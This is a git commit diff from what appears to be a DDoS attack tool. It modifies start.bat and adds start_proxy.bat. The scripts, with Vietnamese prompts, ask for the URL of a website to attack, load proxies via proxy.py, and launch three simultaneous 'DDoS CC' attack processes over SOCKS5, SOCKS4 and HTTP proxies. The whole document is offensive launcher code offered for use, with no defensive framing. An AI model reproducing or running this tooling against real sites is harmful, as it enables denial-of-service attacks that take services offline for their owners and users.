5c3b9ebf87f3bad5dc3a0ede3ce730676a07cd77
Ling <59746573+ndbiaw@users.noreply.github.com>
2022-09-01 20:47:54 +0700

    Trình tải proxy

--- start.bat
+++ start.bat
@@ -1,6 +1,7 @@
 @echo off
 echo Nhan Enter de tiep tuc. Sau khi an Enter se khoi chay 3 quy trinh tan cong DDoS CC cung luc. De co tuy chon khac, vui long su sung Termial.
 set /p SETURL="Nhap URL trang web can tan cong: "
+set PROXY=.\
 pause
 start socks5.bat
 start socks4.bat
---
+++ start_proxy.bat
@@ -0,0 +1,10 @@
+@echo off
+python proxy.py
+echo Nhan Enter de tiep tuc. Sau khi an Enter se khoi chay 3 quy trinh tan cong DDoS CC cung luc. De co tuy chon khac, vui long su sung Termial.
+set /p SETURL="Nhap URL trang web can tan cong: "
+set PROXY=.\proxies\
+pause
+start socks5.bat
+start socks4.bat
+start http.bat
+exit
